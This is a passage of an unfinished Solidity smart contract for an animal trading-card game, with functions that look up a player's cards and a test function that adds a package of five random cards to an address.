                count = players[msg.sender].animalCards[baseId].length;           

            } else {
                //TO DO: get message from struct of messages.
                err = "You are not owner of this card."; 
            }
        } else {
            //TO DO: get message from struct of messages.
                err = "There is not card with this id."; 
        }

        return (name, count, err);        
    }

    function getMyAllCardIds() __isPlayer public view returns(uint256[]) {
        
        uint256[] memory cards = new uint256[](animalCardBase.length);
        for(uint256 i = 1; i < animalCardBase.length; i++) {
            cards[i] = players[msg.sender].animalCards[i].length;
        }
        return cards;
    }

    //fallback
    function () payable {}
    
}

//#########################################
//###             PANINI                ###
//#########################################
contract Panini is UsingPlayer{

    function Panini() public {
        
    }
    
    function addPackageToPlayerTest(address _address) public payable {

        addRandomCardToPlayer(_address);
        addRandomCardToPlayer(_address);
        addRandomCardToPlayer(_address);
        addRandomCardToPlayer(_address);
        addRandomCardToPlayer(_address);
    }

}

